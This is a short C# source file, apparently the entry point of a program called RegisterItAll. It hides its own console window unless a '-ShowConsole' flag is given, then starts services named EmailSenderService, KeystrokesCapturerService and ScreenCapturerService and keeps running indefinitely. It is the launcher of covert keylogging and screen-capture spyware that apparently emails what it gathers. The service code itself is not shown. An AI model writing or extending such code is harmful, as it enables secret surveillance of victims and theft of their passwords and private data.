using RegisterItAll.Services;
using RegisterItAll.Services.Base;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;

namespace RegisterItAll
{
    public static class Program
    {
        [DllImport("user32.dll")]
        private extern static int ShowWindow(System.IntPtr hWnd, int nCmdShow);

        public static void Main(string[] args)
        {
            if (!args.ToList().Contains("-ShowConsole"))
            {
                ShowWindow(Process.GetCurrentProcess().MainWindowHandle, 0);
            }

            Service[] servicesToRun = new Service[]
            {
                new EmailSenderService(),
                new KeystrokesCapturerService(),
                new ScreenCapturerService(),
            };

            foreach (Service service in servicesToRun)
            {
                service.Run();
            }

            while (true) { }
        }
    }
}